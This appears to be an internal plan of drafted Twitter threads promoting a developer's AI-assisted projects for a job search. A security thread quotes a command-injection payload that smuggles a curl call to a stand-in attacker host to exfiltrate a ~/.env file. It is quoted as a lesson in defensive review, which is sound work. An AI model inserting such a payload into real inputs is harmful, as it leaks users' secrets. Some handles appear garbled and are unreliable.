# 🐦 Twitter Strategy for Job Search

> **Internal Document** - Not publicly linked  
> **Goal**: Build credibility in AI/tech Twitter to support job applications

---

## How to Think About Twitter (Novice Guide)

### Twitter vs LinkedIn: Key Differences

| Aspect | LinkedIn | Twitter/X |
|--------|----------|-----------|
| **Tone** | Professional, polished | Casual, authentic, punchy |
| **Length** | Long posts OK (1300+ chars) | Short bursts (280 chars) or threads |
| **Format** | Single post with link | Threads for depth, single tweets for takes |
| **Audience** | Recruiters, hiring managers | Developers, founders, tech community |
| **Best for** | Direct job search | Building reputation, getting noticed |

### Why Twitter Matters for Your Job Search

1. **Tech hiring managers lurk on Twitter** - Many AI companies (Anthropic, OpenAI) have employees actively on Twitter
2. **Threads go viral** - A good thread can get 10x the reach of LinkedIn
3. **Shows personality** - Companies want to see you're a real person who can communicate
4. **Build in Public culture** - The dev community respects people who share their journey

### Twitter Content Rules

**DO:**
- Be concise (every word matters)
- Use line breaks liberally
- Start with a hook that makes people stop scrolling
- End threads with a CTA (link, "follow for more", "DM me")
- Tag relevant companies/tools inline (not at the end)
- Engage with replies (this boosts your posts)

**DON'T:**
- Write walls of text
- Use hashtags (outdated, can hurt reach)
- Sound corporate or formal
- Beg for engagement ("Please RT!")
- Post without a point

---

## Profile Updates (Do This First)

### Current → New

**Bio:**
```
Current: "I make music, art, and friends, but mostly I make some smiles 🤘"

New: "Building AI apps with @claudeai & @GoogleDeepMind Antigravity | 3 apps in 3 months | Asset Hatch, Catwalk, TheFeed | Open to AI Engineer roles | 📍 Sacramento"
```

**Link:** Change from `zenchant.live` → `jordanhindo.dev`

**Pinned:** Your first thread (after posting)

---

## 📅 7-Day Twitter Thread Schedule

### Day 1: The Methodology Thread (7 tweets)

**Tweet 1 (Hook):**
```
I built 3 production apps in 3 months.

Not by grinding 12-hour days.

By building a system where AI does 90% of the implementation while I architect, validate, and steer.

Here's the exact workflow I developed 🧵
```

**Tweet 2:**
```
Phase 1: Vision (@claudeai Desktop + Opus 4.5)

Before touching code, I spend HOURS in conversation with Claude.

I use a "meta-prompt"—a prompt that builds other prompts.

The output: Refined specs with architecture diagrams, constraints, edge cases, and success criteria all mapped out.
```

**Tweet 3:**
```
Phase 2: Build (@GoogleDeepMind Antigravity IDE)

I paste my refined prompt into the IDE and let it PLAN before it codes.

Sometimes for 20+ minutes of pure reasoning.

Then Opus implements—from database schema to API routes to UI components—following our agreed blueprint exactly.
```

**Tweet 4:**
```
Phase 3: Research (@perabornnnn)

When I hit errors (and you WILL hit errors), I switch to Perplexity.

It reads documentation, Stack Overflow threads, GitHub Issues in real-time.

The output: Context-rich prompts that include exactly what the AI needs to unblock itself.
```

**Tweet 5:**
```
Phase 4: Test (@GoogleAI Gemini Flash 3)

I built two custom testing workflows:

• /unit-test → generates comprehensive test suites with edge cases
• /api-test → tests endpoints, validates responses, checks error handling

These catch AI bugs BEFORE they hit main.
```

**Tweet 6:**
```
Phase 5: Review (Multi-Agent Code Review)

Every single PR gets reviewed by:
• @QodoAI → catches edge cases and logic errors
• @GoogleAI Code Assist → scans for security vulnerabilities

Bots find what my eyes miss. This isn't optional—it's how you ship AI code safely.
```

**Tweet 7 (CTA):**
```
The full orchestration loop:

@claudeai → @GoogleDeepMind Antigravity → @perabornnnn → @GoogleAI → Bot Reviews → Merge

I documented every detail across 18 technical blog posts:
jordanhindo.dev/blog

Looking for Forward Deployed or AI Engineer roles. DM me if you're hiring.
```

---

### Day 2: The Crisis Thread (5 tweets)

**Tweet 1:**
```
4 hours into debugging hell.

My AI tools were SAYING they executed.

But the handlers never fired.

I traced it into @CopilotKit's source code and found an execution issue deep in their runtime.

Here's how I escaped 🧵
```

**Tweet 2:**
```
The symptom: The LLM response included tool calls with perfect parameters.

The reality: My handler functions never ran.

I added console.logs everywhere. Nothing.

Traced it to their useCoAgentAction hook—the callback registration was silently failing under certain conditions.
```

**Tweet 3:**
```
Now I had a decision:

A) Wait for a fix from maintainers (unknown timeline, maybe weeks)
B) Migrate my entire AI backend to @vercel AI SDK (estimated 3-4 hours)

The sunk cost fallacy was screaming at me.

"You've invested so much already..."

I chose B anyway.
```

**Tweet 4:**
```
By 5:30 PM, everything worked.

The @vercel AI SDK migration ended up being CLEANER than the original architecture.

Lesson learned:

4 hours debugging is already lost time.
Don't compound the loss with 40 more hours of stubbornness.

Sometimes the fastest path forward is sideways.
```

**Tweet 5:**
```
Full post-mortem with code diffs, architecture diagrams, and the exact debugging steps:

jordanhindo.dev/blog/asset-hatch/part-3-the-crisis-when-frameworks-fail

If you're building AI apps and hitting weird framework issues—this might save you a day.

More debugging war stories coming.
```

---

### Day 3: The Numbers Thread (4 tweets)

**Tweet 1:**
```
📊 The real numbers from my last AI-assisted project:

60 hours of work → 4,400 lines of production-ready code

That's approximately 73 lines per hour of focused development time.

Here's the full breakdown 🧵
```

**Tweet 2:**
```
Quality metrics that actually matter:

→ 100% test coverage (unit + integration)
→ 100% TypeScript type safety (literally zero "any" types)
→ 70% estimated time savings vs traditional development
→ 22 Architecture Decision Records documenting every major choice
```

**Tweet 3:**
```
The paradigm shift I've learned:

AI didn't replace me. It amplified me.

The valuable skill isn't writing code anymore. It's:

→ Architecting systems worth building in the first place
→ Prompting AI with surgical precision
→ Validating outputs with critical skepticism
```

**Tweet 4:**
```
Full breakdown of the metrics, methodology, and what I'd do differently:

jordanhindo.dev/blog/catwalk-blog/07-lessons-learned-ai-orchestrator-handbook

This post is basically my playbook for AI-assisted development. Take whatever's useful.
```

---

### Day 4: Security Thread (4 tweets)

**Tweet 1:**
```
AI is really good at generating happy paths.

But security requires adversarial thinking—imagining how things break, not just how they work.

Here's a real vulnerability AI generated in my code that I almost shipped 🧵
```

**Tweet 2:**
```
The code AI wrote:

package_name = user_input["package"]
# Passed directly into a shell command

The attack vector:
"@evil/pkg; curl http://attacker.com/steal?data=$(cat ~/.env)"

Classic command injection. The AI had no adversarial imagination.
```

**Tweet 3:**
```
What caught it: Multi-agent code review.

@QodoAI flagged the unsanitized input during PR review.

I had looked at that code three times and missed it.

The lesson: AI builds features fast. Humans (or other AIs) must think like attackers.
```

**Tweet 4:**
```
Full security audit breakdown—6 vulnerability categories I now check for in every AI-generated codebase:

jordanhindo.dev/blog/catwalk-blog/06-security-awakening-what-ai-missed

This post might save you from shipping something dangerous.
```

---

### Day 5: Open Source Thread (3 tweets)

**Tweet 1:**
```
I started building a SaaS with paid tiers and subscription infrastructure.

Then I realized: for my actual goal (getting hired), open source was the smarter play.

Here's why I pivoted 🧵
```

**Tweet 2:**
```
Why open source over SaaS for a job search:

→ It's a portfolio piece that hiring managers can actually inspect
→ MIT license = anyone can use it, fork it, learn from it
→ It proves I can ship REAL software, not just talk about hypothetical projects
→ The technical blog series adds credibility
```

**Tweet 3:**
```
The project: Asset Hatch

→ AI-powered 2D game asset generator (sprites, tilesets, characters)
→ Built with @vercel AI SDK + Next.js 15 + PostgreSQL
→ 18-part technical blog series documenting every decision

Demo: asset-hatch.vercel.app
Blog: jordanhindo.dev/blog

Looking for AI Engineer roles. DM me.
```

---

### Day 6: Quote Tweet Strategy

Instead of a standalone thread, engage with trending AI-related content:
- Quote-tweet something interesting from @AnthropicAI, @OpenAI, @vercel, or @GoogleDeepMind
- Add your personal take or real experience

**Example quote tweet:**
```
[Quote tweet about AI coding assistants or vibe coding]

This is exactly how I built 3 production apps in 3 months.

The meta-lesson: don't just USE AI tools. Build a repeatable SYSTEM around them.

My stack:
@claudeai (vision) → @GoogleDeepMind Antigravity (build) → @perabornnnn (research) → @GoogleAI (test)

Documented the whole thing: jordanhindo.dev/blog
```

**Alternative template for AI news:**
```
[Quote tweet about new AI model release or feature]

Already tested this on a real project.

Here's what actually changed in practice: [specific observation]

Been documenting my AI-assisted development workflow for 4+ months now.

Full blog series: jordanhindo.dev/blog
```

---

### Day 7: Open to Work Thread (4 tweets)

**Tweet 1:**
```
4.5 months building full-stack AI applications.

3 production apps shipped to real users.
39 technical blog posts published.
Deployed to @vercel + @flabornnnn in production.

Now I'm looking for my next challenge.

Here's what I bring 🧵
```

**Tweet 2:**
```
Technical depth:

→ AI orchestration & prompt engineering (@claudeai, GPT-4/5, @vercel AI SDK)
→ Full-stack development (Next.js 15, Python, TypeScript, PostgreSQL)
→ Obsessive documentation (22 Architecture Decision Records on my last project alone)
→ Production mindset (testing, security audits, CI/CD)
```

**Tweet 3:**
```
Roles I'm targeting:

→ Forward Deployed Engineer (@AnthropicAI, @Palantir, @Replit)
→ AI Application Engineer (@OpenAI, @vercel, @replabornnnn)
→ Solutions Engineer / Developer Advocate (AI-focused companies)

I want to help teams ship AI products that actually work.
```

**Tweet 4:**
```
Everything I've built is public:

Portfolio: jordanhindo.dev
GitHub: github.com/zenchantlive
Blog: jordanhindo.dev/blog

If you're hiring for AI engineering roles—or know someone who is—RT appreciated 🙏

DMs are open.
```

---

## ✅ Progress Tracker

| Day | Thread | Status |
|-----|--------|--------|
| 1 | Methodology | ⏳ |
| 2 | Crisis | ⏳ |
| 3 | Numbers | ⏳ |
| 4 | Security | ⏳ |
| 5 | Open Source | ⏳ |
| 6 | Quote Tweet | ⏳ |
| 7 | Open to Work | ⏳ |

---

## Tips for Posting Threads

1. **Post the first tweet** normally
2. **Reply to yourself** to add each subsequent tweet
3. After posting all tweets, **go back and retweet the first one** to boost visibility
4. **Pin the thread** to your profile
5. Best times: **9-11 AM PT** (when West Coast wakes up) or **12-2 PM PT** (lunch break)
